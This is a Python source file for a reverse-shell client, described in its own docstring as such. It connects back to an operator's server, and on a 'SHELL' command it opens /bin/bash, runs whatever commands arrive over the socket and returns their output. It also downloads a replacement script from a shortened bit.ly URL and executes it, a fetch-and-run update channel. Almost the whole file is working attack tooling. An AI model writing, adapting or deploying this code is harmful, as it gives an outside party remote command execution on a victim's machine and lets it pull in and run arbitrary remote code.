"""
Async client for reverse shelling ୧༼ಠ益ಠ༽︻╦╤─
Expects server ip and port as command line arguments

When receiving a b'SHELL':
    Opens /bin/bash and connect stdin/stdout

Updates itself by executing the .py downloaded from RELEASE


"""

import urllib.request
import subprocess
import logging
import socket
import time
import sys
import os
import re

HOST = sys.argv[1]
PORT = int(sys.argv[2])

RELEASE = "https://bit.ly/2Cp4hXU"


def restart(file_url=RELEASE, generation='_zero'):
    script_name = f"client{generation}.py"
    urllib.request.urlretrieve(file_url, script_name)
    pythonpath = sys.executable
    os.execl(pythonpath, pythonpath, script_name, HOST, PORT)


logformat = logging.Formatter("%(asctime)s %(levelname)s:%(name)s: %(message)s")
logger = logging.getLogger("client")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler('client.log')
fh.setLevel(logging.DEBUG)
fh.setFormatter(logformat)
logger.addHandler(fh)

logger.info(sys.version_info)

print(sys.byteorder)


def subp_run(command):
    return subprocess.run(command, shell=True,
                          stdout=subprocess.PIPE,
                          stderr=subprocess.STDOUT,
                          stdin=subprocess.PIPE,
                          timeout=None)



def ping(interval=5):
    # socket family is AF_INET (ipv4)
    # socket type is SOCK_STREAM (connection oriented TCP protocol)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.connect((HOST, PORT))
            s.sendall(b'Marco')
            data = s.recv(4)
            print('Received', repr(data))

        except ConnectionRefusedError as err:
            logger.warning(err)
            restart()
            return err

        if data == b'Polo':
            data = s.recv(1024)  # TODO timeout before back to pinging
            if data == b'SHELL':
                print(data)
                session(s)  # Drop into a session
        else:
            time.sleep(interval)
            ping()  # Close this socket, reopen a new one, try again


def session(s: socket):
    """
    Opens a /bin/bash, pipes received data into its stdin, sends back stdout/err

    Messages are at most 1024 bytes and end with  b' ADD', b' AYE'  or b' BYE'
        - b' ADD' signals more will follow
        - b' AYE' signals the end (of a shell command)
        - b' BYE' signals the end of this session

    The bodies of received messages are concatenated (until an b' AYE') and
    executed i.e. sent to the /bin/bash with b' ; echo exit status $?\n'.

    The command its stdout is streamed back to the server line by line.

    :param s: A socket that received b'SHELL' (from server.py)
    """

    proc = subprocess.Popen(['/bin/bash'],
                            shell=False,
                            stdin=subprocess.PIPE,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT,
                            bufsize=0)

    while True:

        messages = []  # List of bytes
        packet = s.recv(1024)
        print(packet)
        assert packet[:8] == b'TIMEOUT '

        t = re.search(b'\d+', packet).group()  # Returns at first match
        body = packet[8+len(t)+1:-4]
        type = packet[-4:]


        if type == b' AYE':  # Execute body
            # command = b''.join(message for message in messages)
            command = body
            proc.stdin.write(command + b'\n')
            print(proc.stdout.readline())

        elif type == b' ADD':  # Append to body
            pass

        elif type == b' BYE':  # Graceful
            print(proc.communicate())
            pass

        else:
            print("Panic")
            restart(file_url=RELEASE, generation="_ghetto")

# loop_shell(1)
data = ping()




if __name__ == "__main__":
    assert sys.version_info >= (3, 7), "Pls"
    while True:
        ping(interval=10)


